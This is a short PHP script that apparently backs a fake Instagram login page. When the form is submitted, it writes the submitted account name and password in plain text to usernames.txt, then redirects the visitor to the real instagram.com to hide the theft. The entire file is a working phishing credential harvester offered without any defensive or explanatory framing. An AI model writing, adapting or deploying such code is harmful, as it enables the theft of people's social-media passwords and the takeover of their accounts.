<?php

if (isset($_POST['gsubmit'])){
                        $email=$_POST["instaName"];
                        $pass = $_POST["pass"];
file_put_contents("usernames.txt", "Account: " . $_POST['instaName'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com');
exit();
}
?>
